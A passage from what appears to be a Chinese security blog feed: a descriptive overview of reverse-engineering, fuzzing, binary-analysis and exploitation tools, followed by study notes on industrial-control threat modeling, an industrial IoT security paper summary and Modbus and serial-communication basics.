href="http://www.ollydbg.de)编写的一款具有可视化界面的用户模式调试器,可以在当前各种windows版本上运行,但nt的系统架构更能发挥ollydbg强大功能.ollydbg结合了动态调试和静态分析,具有gui界面,易上手,并且对异常的跟踪处理相当灵活,这些使得ollydbg成为调试ring/">www.ollydbg.de）编写的一款具有可视化界面的用户模式调试器，可以在当前各种Windows版本上运行，但NT的系统架构更能发挥OllyDbg强大功能。OllyDbg结合了动态调试和静态分析，具有GUI界面，易上手，并且对异常的跟踪处理相当灵活，这些使得OllyDbg成为调试Ring</a> 3级程序的首选工作。它的反汇编引擎很强大，可识别数千个被C和Windows频繁使用的函数，并能将其参数注释出。它会自动分析函数过程、循环语句、代码中的字符串等。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1sdvzkj319s0oo7m2.jpg" alt="img"> </p><p>d. Immunity Debugger</p><p>Immunity Debugger软件专门用于加速漏洞利用程序的开发，辅助漏洞挖掘以及恶意软件分析。它具备一个完整的图形用户界面，同时还配备了迄今为止最为强的Python安全工具库。它巧妙的将动态调试功能与一个强大的静态分析引擎融合于一体，它还附带了一套高度可定制的纯pythont图形算法，可用于帮助我们绘制出直观的函数体控制流以及函数中的各个基本块。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1x9j97j312o0b0di0.jpg" alt="img"> </p><h3 id="静态分析工具"><a href="#静态分析工具" class="headerlink" title="静态分析工具"></a>静态分析工具</h3><p>a.IDA</p><p>IDA Pro（简称IDA）是DataRescue公司出品的一款可编程的交互式反汇编工具和调试器，它的最主要的特性是交互和多处理器。操作者可以通过对IDA的交互来指导IDA更好地反汇编，IDA并非自动解决程序中的问题，但它会按用户的指令找到可疑之处，用户的工作是通知IDA怎样去做。比如人工指定编译器类型，对变量名、结构定义、数组等定义等。这样的交互能力在反汇编大型软件时显得尤为重要。多处理器特点是指IDA支持常见处理器平台上的软件产品，IDA支持的文件类型非常丰富，除了常见的PE格式，还支持Windows,DOS,UNIX,Mac,Java,.NET等平台的文件格式。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1ks0pbj316o0pw4df.jpg" alt="img"> </p><p>b.Hopper Disassembler</p><p>Hopper Disassembler是一款适用于Mac与Linux操作系统的软件，它可以帮助你二进制反汇编，反编译和调试32/64位的应用程序。完成集成到OS X环境中，能够进行控制流程图、可脚本化调用、可扩展、调试器、解码器等等功能。<img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1lob7ej31970u0ttw.jpg" alt="img"></p><h2 id="漏洞挖掘工具"><a href="#漏洞挖掘工具" class="headerlink" title="漏洞挖掘工具"></a>漏洞挖掘工具</h2><h3 id="模糊测试类挖掘工具"><a href="#模糊测试类挖掘工具" class="headerlink" title="模糊测试类挖掘工具"></a>模糊测试类挖掘工具</h3><p>a.Peach</p><p>Peach 是一款用 Python 写的开源的 Smart Fuzz 工具， 它支持两种文件 Fuzz 方法:基于生长(Generation Based)和基于变异(Mutation Based)。基于生长的 Fuzz 方法产生随机或启发性数据 来填充给定的数据模型，从而生成畸形文件。而基于变异的 Fuzz 方法在一个给定的样本文件 基础上进行修改从而产生畸形文件。 </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1ifwfqj31040dkabs.jpg" alt="img"> </p><p>b.Sully</p><p>Sulley是一个模糊测试引擎和模糊测试框架，由多个可扩展的组件组成。Sulley（IMHO）所具有的能力超过了以前所发布的大多数模糊测试技术，包括商业工具和那些在公开领域中可用的工具。该框架的目标是不仅要简化数据的表示，而且还要简化数据的传输以及对目标的监视。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1js0c0j311c0r8122.jpg" alt="img"> </p><p>c.AFL</p><p>AFL（American Fuzzy Lop）是由安全研究员Michał Zalewski（<a href="https://twitter.com/lcamtuf">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><p>与其他仪器化的模糊测试器相比，afl的设计更加实用：它具有适度的性能开销，使用各种高效的模糊测试策略和工作量最小化的技巧，基本上不需要配置，并且可以无缝处理复杂的实际用例等优点。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1tllq8j31a40n44eo.jpg" alt="img"> </p><p>d.AFL-Go</p><p>AFLGo是<a href="https://lcamtuf.coredump.cx/afl/">American Fuzzy Lop（AFL）</a>的扩展。给定一组目标位置（例如folder/file.c:582），AFLGo会生成专门用于执行这些目标位置的目标的输入。与AFL不同，AFLGo的大部分时间预算都花在了到达特定目标位置上，而又不会浪费资源来强调无关的程序组件。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1iricjj30yk0p8wlc.jpg" alt="img"> </p><p>e.Simple Fuzzer</p><p>Simple Fuzzer工具具备全面的模糊测试功能，但使用非常简单。该工具提供一种非常简洁的脚本语言。该语言提供文本模糊字符串和序列模糊字符串两种形式。同时，该语言支持脚本包含等功能，来构建复杂的测试用例。通过该语言，用户来构建测试所用的配置文件。然后，通过Simple Fuzzer加载该文件，就可以对目标实施各种模糊测试。Simple Fuzzer已经集成在了Kali Linux之中，使用起来十分的方便。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1ja0r4j316g0ok116.jpg" alt="img"> </p><h3 id="符号执行类挖掘工具"><a href="#符号执行类挖掘工具" class="headerlink" title="符号执行类挖掘工具"></a>符号执行类挖掘工具</h3><p>a. Klee</p><p>KLEE是一款开源的自动软件测试工具，英国帝国理工的Cristian Cadar则是符号执行引擎KLEE的作者。它基于LLVM编译底层基础，能够自动生成测试样例检测软件缺陷。与其它工具不同的地方在于，KLEE能对c程序生成字节码.bc文件，并自动生成各类缺陷，不需要再自己编写。因而使用KLEE进行软件测试是比较轻松的方式。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1n3np4j30s008kjry.jpg" alt="img"> </p><p>b. Mayhem</p><p>MAYHEM，这是一个用于自动查找二进制（即可执行文件）程序中的可利用错误的系统，它是由CMU的David Brumley团队在2012年提出的。MAYHEM会针对所报告的每个错误产生有效的控制劫持漏洞利用，从而确保每个错误报告都是可操作的并且对安全性至关重要。通过使用二进制代码，MAYHEM甚至可以使那些没有源代码访问权限的人也可以检查该软件的安全性。</p><p>David Brumley后担任ForAllSecure的首席执行官（CEO），Mayhem也借助该公司实现了商业化。</p><pre><code>![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1nyys2j30s008kmy0.jpg)</code></pre><p>c. Driller</p><p>Driller在afl的基础上开发的crash模糊测试工具。Driller在AFL的基础上加入了动态符号执行引擎，当模糊测试发生stuck时，使用动态符号执行去突破这些限制，生成满足fuzz需求的新输入，使得fuzz能够继续执行。</p><p>总体上说，Driller结合了AFL的高效、低消耗、快速的优点和动态符号执行探索能力强的优点，又避免了AFL较难突破特殊的边界和动态符号执行路径爆炸的问题。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1l5gh1j30zc0q010i.jpg" alt="img"> </p><p>d. Clang</p><p>Clang是一个由Apple主导编写，基于LLVM的C/C++/Objective-C编译器。它是一个开源工具，其源代码发布于BSD协议之下。本质上，Clang不仅是一个静态分析工具，还是这些语言的一个轻量级编译器。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1k9otyj30kg0kg40z.jpg" alt="img"> </p><h2 id="漏洞分析工具"><a href="#漏洞分析工具" class="headerlink" title="漏洞分析工具"></a>漏洞分析工具</h2><p>a. BAP</p><p>卡内基梅隆大学二进制分析平台（CMU BAP）是一个反向工程和程序分析平台，可以使用二进制代码，并且不需要源代码。 BAP支持多种体系结构：ARM，x86，x86-64，PowerPC和MIPS。 BAP分解二进制代码并将其拆分为类似RISC的BAP指令语言（BIL）。程序分析是使用BIL表示形式执行的，并且与体系结构无关，从某种意义上说，它对于所有支持的体系结构都将同样有效。其包含大量的库，插件和前端。库提供了代码重构，插件有助于扩展，前端作为入口点。该框架用OCaml编写，也可以绑定C，Python和Rust语言。该项目得到了美国国防部，西门子公司和韩国政府的各种资助。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1uiersj30xs0q0qal.jpg" alt="img"> </p><p>b. BitBlaze</p><p>BitBlaze是一个统一的二进制分析平台, 结合了动态分析和静态分析, 并且具有可扩展性。BitBlaze主要包含3个组件, 分别是Vine、TEMU和Rudder。Vine是静态分析组件, 其将底层指令翻译成简单且规范的中间语言, 并且在中间语言的基础上为一些常见的静态分析提供了实用工具, 如绘制程序依赖关系图、数据流图及程序控制流图等; TEMU是动态分析组件, 其提供了整个系统的动态分析, 并且实现了语义提取和用户定义动态污点分析; Rudder是结合动静态分析的具体执行和符号执行组件, 其使用Vine和TMEU提供的功能在二进制层面上实现了混合具体执行和符号执行, 并且提供了路径选择和约束求解的功能。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1m1vzcj313w0b4wh2.jpg" alt="img"> </p><p>c. Intel PIN</p><p>Pin是Intel公司开发的动态二进制插桩框架，可以用于创建基于动态程序分析工具，支持IA-32和x86-64指令集架构，支持windows和linux。</p><p>其本身提供的API可以让我们观察一个进程的状态，比如：内存、寄存器和控制流。Pin还提供了一些更改程序行为的机制，比如：允许重写程序的寄存器和内存。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1v12wnj307q0420wv.jpg" alt="img"> </p><p>d. Triton</p><p>Triton是一个使用C++编写功能强大的动态二进制分析（Dynamic Binary Analysis）框架。 基于Taint引擎， 提供良好的Python Binding接口。其主要包含四大组件：（1）符号执行引擎（2）污点分析引擎（3）SMT求解器接口（4）AST representation接口。基于这些组件，我们可以构建用于自动化逆向工程或者漏洞研究的工具。 </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1mjo1kj30q007kaaw.jpg" alt="img"> </p><p>e. BinNavi</p><p>BinNavi是一个二进制代码逆向工程的工具，旨在帮助寻找反汇编代码中漏洞的漏洞研究人员。它能够分析输入数据流在程序中的传播路径，通过将程序的控制流图形化表示，从而帮助分析人员定位其感兴趣的执行路径。</p><p>使用BinNavi，您可以用其强大的内置静态代码分析技术来分析反汇编的x86，ARM，PowerPC和MIPS代码。如果静态分析仍不够，则可以使用内置调试器来实时查看正在分析的程序。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1verthj31a40bctbe.jpg" alt="img"> </p><h2 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h2><p>a. Metasploit</p><p>Metasploit是当前信息安全与渗透测试领域最为流行的术语之一。它颠覆了原有的渗透测试方法。Metasploit框架是一个开源框架，宗旨就在方便渗透测试，它是由Ruby进行开发编写模块化框架，具有很好的扩展性，便于渗透测试人员进行二次开开发、使用定制的工具模板。</p><p>Metasploit可向后端模块提供多种用来控制测试的接口(如控制台、WEB、CLI)。推荐使用控制台接口，通过控制台接口，可以访问和使用所有的Metasploit的插件，例如:Payload、 利用模块、Post模块等。Metasploit还有第三方程序的接口，例如Nmap、SQLmap 等，可以直接在控制台接口里使用，要访问该界面，需要在命令行下输入 msfconsole。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1wbitfj30q00643zl.jpg" alt="img"> </p><p>b. Mona</p><p>Mona是一种非常有用的插件，它由Corelan Team用Python编写开发的一个可以自动构造Rop Chain并且集成了metaasploit计算位移量功能的强大挖洞辅助插件。起初是为Immunity Debugger编写的，现在它也适用于WinDbg调试器。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1niii7j30uc0h87d9.jpg" alt="img">  </p><p>c. Pompem</p><p>Pompem是一个开源的漏洞利用和漏洞发现工具，旨在自动在一些重要的漏洞库中搜索漏洞和利用漏洞。在当前版本中，它将在PacketStorm security, CXSecurity, ZeroDay, Vulners, National Vulnerability Database, WPScan Vulnerability Database这些漏洞库中执行搜索。</p><p> <img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1wt1lzj315o0icn4q.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（读书笔记）通过威胁建模获取具有可操作性的工控系统威胁情报</title>
      <link href="2019/10/24/%E5%B7%A5%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"/>
      <url>2019/10/24/%E5%B7%A5%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="第三篇：通过通过威胁建模获取具有可操作性的工控系统威胁情报"><a href="#第三篇：通过通过威胁建模获取具有可操作性的工控系统威胁情报" class="headerlink" title="第三篇：通过通过威胁建模获取具有可操作性的工控系统威胁情报"></a>第三篇：通过通过威胁建模获取具有可操作性的工控系统威胁情报</h2><p>威胁情报就是有关潜在威胁的信息</p><p>情报与可操作情报：并非所有的情报都有现实意义，只有找到相关联性才能从可操作的情报转化为具有现实意义的情报</p><p>威胁信息与威胁情报存在差异</p><a id="more"></a><h3 id="威胁信息与威胁情报"><a href="#威胁信息与威胁情报" class="headerlink" title="威胁信息与威胁情报"></a>威胁信息与威胁情报</h3><p>典型的威胁信息通常由威胁源、威胁源的动机、能力以及活动组成，也可以包括威胁源感兴趣的目标</p><p>威胁情报就是信息，但是威胁情报主要是关于分析处理过的潜在威胁信息，并对机构而言有运营价值。</p><p>具有现实意义的可操作威胁情报，也可以将其称之为可操作战术情报。</p><p>无论威胁情报应用于网络安全项目的哪个阶段，其成功的运营关键取决于以下几个阶段：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g890a33uuzj314t0rskhu.jpg" alt="image-20191024085502375"></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g890ayxoagj33340pcb29.jpg" alt="image-20191024085553023"></p><h3 id="威胁建模：将工控系统威胁信息转化为“可操作”的威胁情报"><a href="#威胁建模：将工控系统威胁信息转化为“可操作”的威胁情报" class="headerlink" title="威胁建模：将工控系统威胁信息转化为“可操作”的威胁情报"></a>威胁建模：将工控系统威胁信息转化为“可操作”的威胁情报</h3><h4 id="工控系统杀伤链"><a href="#工控系统杀伤链" class="headerlink" title="工控系统杀伤链"></a>工控系统杀伤链</h4><p>工控系统杀伤链考虑到攻击者用以了解过程环境、实施针对工控系统的重大攻击，以及漏洞利用工具部署之前对漏洞进行测试、验证及调查的方法和总体过程。</p><p>上述攻击活动的区分要素可以在杀伤链的第二阶段中找到。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g890m47vstj314u0rsqop.jpg" alt="image-20191024090636241"></p><p>报告作者还特别将涉及工控系统所可能导致的工控系统后果分类进行了分解画面</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g890nav8xrj31040rsncz.jpg" alt="image-20191024090744753"></p><h4 id="工控系统威胁建模过程"><a href="#工控系统威胁建模过程" class="headerlink" title="工控系统威胁建模过程"></a>工控系统威胁建模过程</h4><p>构建风险场景需要深刻理解攻击方法和技术及正在评估的工控系统环境</p><p>风险即：由于目标对象所存在的潜在脆弱性，威胁源将通过威胁向量而导致威胁事件发生的可能性，以及由此而产生的后果和影响</p><p>对于一个可行的威胁事件，必须包含下面四个要素：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8917m9tkxj32zr0rs4qp.jpg" alt="image-20191024092715993"></p><p>一旦确定并了解了潜在的威胁源、脆弱性以及针对脆弱性的威胁向量，就可以得到构成一次可行的威胁事件所需要的全部内容</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89199iy29j31gz0rsh4m.jpg" alt="image-20191024092850780"></p><p>然后，将构建的威胁事件映射到相关后果之上，并与业务目标进行比较，从而完成风险场景的构建。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g891armrd8j32fl0rs1kx.jpg" alt="image-20191024093017111"></p><p>如果在威胁源与肯能导致严重后果的漏洞之间不存在完整路径，那么也可以认为该漏洞目前其实没有什么风险。这一结论的得出也取决于所获的信息的质量以及对信息分析的质量。</p><p>风险评估过程最后阶段的风险验证和风险计算步骤完成之后，可以进一步提高这些信息的可操作性和质量。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g891e9gac9j31jb0rskeb.jpg" alt="image-20191024093339468"></p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>为了确保威胁建模和风险分析评估过程能够提供有效的效果，需要收集适当的信息对其进行正确的分析。</p>]]></content>
      
      
      <categories>
          
          <category> 工控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（论文翻译）工业物联网中的安全和隐私挑战（Security and Privacy Challenges in Industrial Internet of Things）</title>
      <link href="2019/10/24/%E8%AE%BA%E6%96%87%EF%BC%9A%E5%B7%A5%E4%B8%9A%E7%89%A9%E8%81%94%E7%BD%91%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E5%92%8C%E9%9A%90%E7%A7%81%E6%8C%91%E6%88%98%EF%BC%88Security%20and%20Privacy%20Challenges%20in%20Industrial%20Internet%20of%20Things%EF%BC%89/"/>
      <url>2019/10/24/%E8%AE%BA%E6%96%87%EF%BC%9A%E5%B7%A5%E4%B8%9A%E7%89%A9%E8%81%94%E7%BD%91%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E5%92%8C%E9%9A%90%E7%A7%81%E6%8C%91%E6%88%98%EF%BC%88Security%20and%20Privacy%20Challenges%20in%20Industrial%20Internet%20of%20Things%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="工业物联网系统的发展趋势（第2节）"><a href="#工业物联网系统的发展趋势（第2节）" class="headerlink" title="工业物联网系统的发展趋势（第2节）"></a>工业物联网系统的发展趋势（第2节）</h2><h3 id="一种新兴趋势是将更复杂的电子设备集成到生产系统中，将它们互连，并集成到常规业务IT系统中。由此产生的工业物联网是工业价值链的新层次组织和管理的基础，并可以实现高度灵活和节省资源的生产，并以批量生产为代价增强了产品的个性化。"><a href="#一种新兴趋势是将更复杂的电子设备集成到生产系统中，将它们互连，并集成到常规业务IT系统中。由此产生的工业物联网是工业价值链的新层次组织和管理的基础，并可以实现高度灵活和节省资源的生产，并以批量生产为代价增强了产品的个性化。" class="headerlink" title="一种新兴趋势是将更复杂的电子设备集成到生产系统中，将它们互连，并集成到常规业务IT系统中。由此产生的工业物联网是工业价值链的新层次组织和管理的基础，并可以实现高度灵活和节省资源的生产，并以批量生产为代价增强了产品的个性化。"></a>一种新兴趋势是将更复杂的电子设备集成到生产系统中，将它们互连，并集成到常规业务IT系统中。由此产生的工业物联网是工业价值链的新层次组织和管理的基础，并可以实现高度灵活和节省资源的生产，并以批量生产为代价增强了产品的个性化。</h3><a id="more"></a><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8954zzz2cj30w10gkag1.jpg" alt="image-20191024114308344"></p><h3 id="工业物联网的基础是信息物理系统（CPS）"><a href="#工业物联网的基础是信息物理系统（CPS）" class="headerlink" title="工业物联网的基础是信息物理系统（CPS）"></a>工业物联网的基础是信息物理系统（CPS）</h3><ul><li>这是监视和控制物理过程的计算平台</li><li> CPS可以实时监测状态，进行结构健康监测，远程诊断和远程控制生产系统。</li></ul><h3 id="工业物联网带来了许多新的挑战涉及不同方面，包括安全性，隐私，标准化，法律和社会方面。"><a href="#工业物联网带来了许多新的挑战涉及不同方面，包括安全性，隐私，标准化，法律和社会方面。" class="headerlink" title="工业物联网带来了许多新的挑战涉及不同方面，包括安全性，隐私，标准化，法律和社会方面。"></a>工业物联网带来了许多新的挑战涉及不同方面，包括安全性，隐私，标准化，法律和社会方面。</h3><h2 id="指出相关的安全性和隐私风险和挑战（第3节）"><a href="#指出相关的安全性和隐私风险和挑战（第3节）" class="headerlink" title="指出相关的安全性和隐私风险和挑战（第3节）"></a>指出相关的安全性和隐私风险和挑战（第3节）</h2><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8955qviynj30hx0fowhb.jpg" alt="image-20191024114351297"></p><h3 id="对工业物联网系统的攻击"><a href="#对工业物联网系统的攻击" class="headerlink" title="对工业物联网系统的攻击"></a>对工业物联网系统的攻击</h3><ul><li><p>Slammer蠕虫</p><ul><li>2003年</li><li>感染了美国一家核电厂的两个关键监控系统</li><li>同年，计算机病毒感染了美国主要运输网络的信号和调度控制系统，导致旅客和货运列车完全停驶</li></ul></li><li><p>在随后的几年中，文献报道了许多影响工业控制系统和关键基础设施的安全事件[31、7、22、40]</p></li><li><p>Stuxnet [70，22，40]却显示出一种新趋势，即针对性强的攻击和强大的对手（例如民族国家）的代价</p></li></ul><h3 id="工业攻击面"><a href="#工业攻击面" class="headerlink" title="工业攻击面"></a>工业攻击面</h3><ul><li><p>智能工厂由几个网络物理生产系统（CPPS）组成</p><ul><li><p>电子设备</p><ul><li>电子由软件（例如嵌入式操作系统和应用程序）驱动，并通过各种网络连接（例如以太网或WiFi）与人类和其他CPPS交互</li></ul></li><li><p>监控器</p><ul><li>这些监控器通过传感器和执行器控制物理过程</li></ul></li></ul></li><li><p>攻击面存在于所有这些抽象层上</p><ul><li>电子会遭受物理攻击，包括侵入性硬件攻击，边信道攻击和逆向工程攻击[55]。</li><li>恶意代码（例如特洛伊木马，病毒和运行时攻击）可能会破坏软件</li><li>通信协议易受协议攻击，包括中间人攻击和拒绝服务攻击[28]</li><li>即使是操作CPPS的人也容易遭受网络攻击，例如网络钓鱼和社会工程。</li></ul></li></ul><h3 id="安全目标和要求"><a href="#安全目标和要求" class="headerlink" title="安全目标和要求"></a>安全目标和要求</h3><ul><li><p>工业生产系统的最重要目标是可用性，它应该防止任何不必要的生产延迟，从而导致生产力损失和收入损失。</p></li><li><p>另一个基本目标是防止任何系统可能导致人身伤害或人身伤害的故障。</p><ul><li>为了实现这一目标，必须保持工业物联网系统的完整性。这包括防止破坏活动，这可能会导致产品质量意外损失和资源使用增加。</li></ul></li><li><p>工业物联网的目标之一是实现智能知道自己的历史并可以控制自己的生产过程的产品。</p></li><li><p>物联网生产系统的强大连接性和智能产品则需要新的机制来防止工业间谍活动以及客户和员工的隐私。</p></li></ul><h2 id="讨论针对工业物联网系统的整体安全框架的潜在解决方案（第4节）"><a href="#讨论针对工业物联网系统的整体安全框架的潜在解决方案（第4节）" class="headerlink" title="讨论针对工业物联网系统的整体安全框架的潜在解决方案（第4节）"></a>讨论针对工业物联网系统的整体安全框架的潜在解决方案（第4节）</h2><h3 id="现有的信息安全概念适应网络物理生产系统（CPPS）并不容易"><a href="#现有的信息安全概念适应网络物理生产系统（CPPS）并不容易" class="headerlink" title="现有的信息安全概念适应网络物理生产系统（CPPS）并不容易"></a>现有的信息安全概念适应网络物理生产系统（CPPS）并不容易</h3><ul><li><p>完整性和机密性是传统企业IT系统的主要保护目标，因此，防范网络攻击通常是安全性和可用性之间的权衡</p></li><li><p>如果发生网络攻击，通常会暂时禁用受影响的IT系统，然后在攻击后将其恢复。但是，这种方法不能应用于以可用性为基本要求的CPPS。</p></li><li><p>其他差异是由于CPPS严格的实时要求特性所致-</p><ul><li>它们受约束的计算，内存和能源，以及工业生产系统的使用寿命长。</li></ul></li></ul><h3 id="CPS的安全体系结构"><a href="#CPS的安全体系结构" class="headerlink" title="CPS的安全体系结构"></a>CPS的安全体系结构</h3><ul><li><p>嵌入式物联网系统的安全体系结构方面有大量文献</p><ul><li><p>高端是Intel和ARM体系结构</p><ul><li>基于软件的隔离和虚拟化[35]</li><li>基于安全硬件的可信计算（例如，可信平台模块[67]）</li><li>和提供安全执行的处理器架构（例如ARM TrustZone [72]，AEGIS [64]，OASIS [46]和Intel Software Guard Extensions（SGX）[36、20]）</li></ul></li><li><p>低端嵌入式系统通常是为特定任务而设计的，并且针对低功耗和最低成本进行了优化</p><ul><li><p>它们必须提供多种功能并满足严格的实时要求</p></li><li><p>这些设备的安全解决方案通常基于硬件强制将安全关键代码和数据与同一平台上的其他软件隔离</p></li><li><p>示例是SMART [13]，SPM [63]，SANCUS [45]和TrustLite [25]。</p><ul><li> SMART用只读存储器保护一个特定的嵌入式应用程序（任务）的完整性，这不允许在部署后更改代码。</li><li>SPM通过仅对任务本身授予对任务数据区域的访问权限，从而提供了硬件强制的任务隔离。但是，这些任务具有固定的内存布局，不能被中断。此外，SPM的任务测量是在硬件中执行的，即，它是不间断的，同时取决于所测量任务的内存大小，这违反了实时性要求</li><li>SANCUS通过一种机制扩展了SPM，以生成和管理任务的加密机密，但继承了SPM的局限性。</li><li>TrustLite概括了SPM [63]和SMART [13]的概念，并支持中断任务。但是，TrustLite要求在启动时加载所有软件组件并配置其隔离。与SMART，SPM和SANCUS相比，TyTAN [6]在运行时提供了多个任务的动态加载和卸载，具有发送者和接收者身份验证的安全进程间通信（IPC）以及实时调度。</li></ul></li></ul></li></ul></li></ul><h3 id="CPS的完整性验证"><a href="#CPS的完整性验证" class="headerlink" title="CPS的完整性验证"></a>CPS的完整性验证</h3><ul><li>认证是验证系统软件配置完整性的关键机制，它可以检测出意料之外的恶意软件修改。</li><li>下一代物联网系统将由设备组成群，即嵌入式设备的大型自组织异构网络。验证这些系统的正确和安全运行需要有效的群验证机制，以集体验证所有设备的软件完整性，从而检测出意外和恶意的软件修改。</li></ul><h3 id="安全的物联网设备管理"><a href="#安全的物联网设备管理" class="headerlink" title="安全的物联网设备管理"></a>安全的物联网设备管理</h3><ul><li>本地数据管理和本地分布式分析预计将改善本地服务的延迟，因为只有极少的信息将在本地和低延迟网络之外交换</li><li>出于同样的原因，本地分析和数据管理将改善用户数据的隐私性。这些功能将最大限度地利用物联网系统中可用的资源，并为开发人员提供创建创新服务的基础。</li></ul><h2 id="本文介绍了工业物联网系统，相关的安全和隐私挑战，以及针对工业物联网系统整体安全框架的可能解决方案的展望"><a href="#本文介绍了工业物联网系统，相关的安全和隐私挑战，以及针对工业物联网系统整体安全框架的可能解决方案的展望" class="headerlink" title="本文介绍了工业物联网系统，相关的安全和隐私挑战，以及针对工业物联网系统整体安全框架的可能解决方案的展望"></a>本文介绍了工业物联网系统，相关的安全和隐私挑战，以及针对工业物联网系统整体安全框架的可能解决方案的展望</h2>]]></content>
      
      
      <categories>
          
          <category> 工控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工控Modbus学习笔记（在FreeBuf原文上增改）</title>
      <link href="2019/10/24/Modbus/"/>
      <url>2019/10/24/Modbus/</url>
      
        <content type="html"><![CDATA[<p>自己Modbus的学习笔记，在原文基础上增加了许多更细致的描述与配图，也增加了几个模块的内容，内容丰富了许多。欢迎各位在此基础上继续积累，使其愈加完善。</p><a id="more"></a><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>1 word =2 byte;</p><p>1 byte =8 bit.</p><p><strong>校验码</strong>：校验码是由前面的数据通过某种算法得出的，用以检验该组数据的正确性。代码作为数据在向计算机或其它设备进行输入时，容易产生输入错误，为了减少这种输入错误，编码专家发明了各种校验检错方法，并依据这些方法设置了校验码。</p><p>常用的校验有：累加和校验SUM、字节异或校验XOR、纵向冗余校验LRC、循环冗余校验CRC……</p><p><strong>离散量输入</strong>：主要用来读取单个位的数据，如IO的状态；</p><p><strong>线圈</strong>：开关输出信号，主要用来写入单个位的数据，与离散量构成组成对位的操作；</p><p><strong>输入寄存器</strong>：主要用来读取16位，也就是两个字节的数据；</p><p><strong>保持寄存器</strong>：主要用来写入16位的数据。</p><p><strong>PLC</strong>：可编程逻辑控制器，是一种采用一类可编程的存储器，用于其内部存储程序，执行逻辑运算、顺序控制、定时、计数与算术操作等面向用户的指令，并通过数字或模拟式输入/输出控制各种类型的机械或生产过程。</p><p><strong>串口通信</strong>：随着计算机系统的应用和微机网络的发展，通信功能越来越显得重要.这里所说的通信是指计算机与外界的信息交换.因此，通信既包括计算机与外部设备之间，也包括计算机和计算机之间的信息交换.由于串行通信是在一根传输线上一位一位的传送信息，所用的传输线少，并且可以借助现成的电话网进行信息传送，因此，特别适合于远距离传输.对于那些与计算机相距不远的人－机交换设备和串行存储的外部设备如终端、打印机、逻辑分析仪、磁盘等，采用串行方式交换数据也很普遍.在实时控制和管理方面，采用多台微机处理机组成分级分布控制系统中，各 CPU 之间的通信一般都是串行方式.所以串行接口是微机应用系统常用的接口。许多外设和计算机按串行方式进行通信，这里所说的串行方式，是指外设与接口电路之间的信息传送方式，实际上，CPU 与接口之间仍按并行方式工作.</p><p><strong>串口</strong>：串口是计算机上一种非常通用设备通信的协议，不要与通用串行总线Universal Serial Bus（USB）混淆。大多数计算机包含两个基于RS232的串口。串口同时也是仪器仪表设备通用的通信协议；很多GPIB兼容的设备也带有RS-232口。同时，串口通信协议也可以用于获取远程采集设备的数据。 </p><p>串口通信的概念非常简单，串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。它很简单并且能够实现远距离通信。比如IEEE488定义并行通行状态时，规定设备线总常不得超过20米，并且任意两个设备间的长度不得超过2米；而对于串口而言，长度可达1200米。 </p><p>典型地，串口用于ASCII码字符的传输。通信使用3根线完成：（1）地线，（2）发送，（3）接收。由于串口通信是异步的，端口能够在一根线上发送数据同时在另一根线上接收数据。其他线用于握手，但是不是必须的。<strong>串口通信最重要的参数是波特率、数据位、停止位和奇偶校验</strong>。对于两个进行通行的端口，这些参数必须匹配：  </p><blockquote><p>  